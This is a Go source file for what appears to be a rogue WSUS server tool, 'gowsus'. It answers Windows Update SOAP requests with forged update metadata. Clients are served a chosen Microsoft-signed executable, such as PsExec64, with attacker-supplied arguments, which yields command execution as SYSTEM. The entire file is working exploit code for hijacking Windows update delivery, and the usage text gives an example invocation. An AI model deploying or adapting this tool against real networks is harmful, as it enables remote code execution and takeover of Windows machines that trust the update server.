package main

import (
	"bytes"
	"crypto/sha1"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"flag"
	"fmt"
	"html"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
)

//go:embed resources/get-authorization-cookie.xml
var getAuthorizationCookieXml string

//go:embed resources/get-config.xml
var getConfigXml string

//go:embed resources/get-cookie.xml
var getCookieXml string

//go:embed resources/get-extended-update-info.xml
var getExtendedUpdateInfoXml string

//go:embed resources/internal-error.xml
var internalErrorXml string

//go:embed resources/register-computer.xml
var registerComputerXml string

//go:embed resources/sync-updates.xml
var syncUpdateXml string

//go:embed resources/report-event-batch.xml
var reportEventBatchXml string

var executeCommand string
var filePath string
var serverAddress string
var serverPort string

func setResourcesXml() {
	u1, _ := uuid.NewRandom()
	u2, _ := uuid.NewRandom()
	u3, _ := uuid.NewRandom()

	ef, _ := os.ReadFile(filePath)
	hash1 := sha1.Sum(ef)
	sha1Str := base64.StdEncoding.EncodeToString(hash1[:])
	hash256 := sha256.Sum256(ef)
	sha256Str := base64.StdEncoding.EncodeToString(hash256[:])

	var revisionIds []string = []string{strconv.Itoa(999999 - rand.Intn(99999)), strconv.Itoa(999999 - rand.Intn(99999))}
	var deploymentIds []string = []string{strconv.Itoa(99999 - rand.Intn(19999)), strconv.Itoa(99999 - rand.Intn(19999))}

	fileSize := strconv.Itoa(len(ef))
	fileName := filepath.Base(filePath) + ".exe"
	fileDownloadURL := "http://" + serverAddress + ":" + serverPort + "/" + u3.String() + "/" + fileName

	lastChangeDate := time.Now().Add(time.Duration(24) * time.Hour * -3).Format(time.RFC3339)
	expireDate := time.Now().Add(time.Duration(24) * time.Hour * 1).Format(time.RFC3339)
	cookieValue := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("A", 47)))

	getConfigXml = strings.NewReplacer("{lastChange}", lastChangeDate).Replace(getConfigXml)
	getCookieXml = strings.NewReplacer("{expire}", expireDate, "{cookie}", cookieValue).Replace(getCookieXml)
	syncUpdateXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
		"{deployment_id1}", deploymentIds[0], "{deployment_id2}", deploymentIds[1],
		"{uuid1}", u1.String(), "{uuid2}", u2.String(),
		"{expire}", expireDate, "{cookie}", cookieValue).Replace(syncUpdateXml)
	getExtendedUpdateInfoXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
		"{sha1}", sha1Str, "{sha256}", sha256Str, "{filename}", fileName,
		"{file_size}", fileSize, "{command}", html.EscapeString(html.EscapeString(executeCommand)), "{url}", fileDownloadURL).Replace(getExtendedUpdateInfoXml)
	getAuthorizationCookieXml = strings.NewReplacer("{cookie}", cookieValue).Replace(getAuthorizationCookieXml)
}

func wsusBaseServer() {
	setResourcesXml()

	http.HandleFunc("/", rootHandler)
	fmt.Printf("Starting server...\n")

	if err := http.ListenAndServe(":"+serverPort, nil); err != nil {
		log.Fatal("Server Run Failed.: ", err)
	}
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet || r.Method == http.MethodHead {
		doHeadOrGet(w, r)
	} else if r.Method == http.MethodPost {
		doPost(w, r)
	} else {
		w.WriteHeader(http.StatusMethodNotAllowed)
	}
}

func doHeadOrGet(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Cache-Control", "private")
	w.Header().Set("X-AspNet-Version", "4.0.30319")
	w.Header().Set("X-Powered-By", "ASP.NET")

	if strings.Contains(r.RequestURI, ".exe") {
		w.Header().Set("Content-type", "application/octet-stream")
		if r.Method == "GET" {
			fmt.Printf("GET request,\nPath: %s\n", r.RequestURI)
			ef, _ := os.ReadFile(filePath)
			w.WriteHeader(http.StatusOK)
			w.Write(ef)
		} else {
			//if Method is HEAD
			fmt.Printf("HEAD request,\nPath: %s\n", r.RequestURI)
			w.WriteHeader(http.StatusOK)
		}
	} else {
		w.Header().Set("Content-type", "text/xml; charset=utf-8")
		w.WriteHeader(http.StatusOK)
	}

}

func doPost(w http.ResponseWriter, r *http.Request) {
	soapAction := r.Header["Soapaction"][0]
	w.Header().Set("Content-type", "application/xml")
	bodyBuf := new(bytes.Buffer)
	io.Copy(bodyBuf, r.Body)
	fmt.Printf("POST request,\nPath: %s\nHeader: %s\nBody: %s\n", r.RequestURI, r.Header, bodyBuf)

	if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getConfigXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getCookieXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(registerComputerXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(syncUpdateXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getExtendedUpdateInfoXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(reportEventBatchXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getAuthorizationCookieXml))
	} else {
		w.Header().Del("Content-type")
		w.WriteHeader(http.StatusNotFound)
	}
}

func main() {
	var (
		sa = flag.String("H", "127.0.0.1", "The listening adress.")
		sp = flag.String("p", "8530", "The listening port.")
		fp = flag.String("e", "", "The Microsoft signed executable returned to the client.")
		ec = flag.String("c", "", "The parameters for the current executable.")
	)
	flag.Parse()
	serverAddress = *sa
	serverPort = *sp
	filePath = *fp
	executeCommand = *ec

	if executeCommand == "" {
		log.Fatal("Example: \ngowsus.exe -H X.X.X.X -p 8530 -e PsExec64.exe -c \"-accepteula -s calc.exe\"")
	}

	if _, err := os.Stat(filePath); err != nil {
		log.Fatal("Executable file not found.\nExample: \ngowsus.exe -H X.X.X.X -p 8530 -e PsExec64.exe -c \"-accepteula -s calc.exe\"")
	}

	fmt.Printf("Host: %s |", serverAddress)
	fmt.Printf("Port: %s |", serverPort)
	fmt.Printf("Executable: %s |", filePath)
	fmt.Printf("Command: %s\n", executeCommand)

	wsusBaseServer()
}
